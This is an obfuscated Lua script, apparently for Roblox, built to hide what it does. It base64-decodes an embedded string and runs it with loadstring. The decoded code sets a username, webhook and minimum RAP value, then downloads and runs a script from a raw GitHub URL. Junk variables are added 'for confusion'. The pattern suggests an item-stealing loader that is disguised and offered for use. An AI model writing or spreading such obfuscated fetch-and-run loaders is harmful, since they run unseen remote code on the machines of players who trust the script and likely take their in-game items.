
local UhYRZaReeuj = 'VXNlcm5hbWUgPSAiR2ciClVzZXJuYW1lMiA9ICJHZyIKV2ViaG9vayA9ICJHZyIKTWluaW11bVJBUCA9IEdnCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZG93c3p6enovdGltb2NpeS9yZWZzL2hlYWRzL21haW4vbWFpbiIsIHRydWUpKSgp'
local rfEiTTtiLRRN = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local InWFCAoWR = rfEiTTtiLRRN(UhYRZaReeuj)
loadstring(InWFCAoWR)() -- Run decoded code

-- Dummy variables for confusion
local AqGvnfwYHcv = math.random()
local ZfyvoIpX = "This is a dummy string"
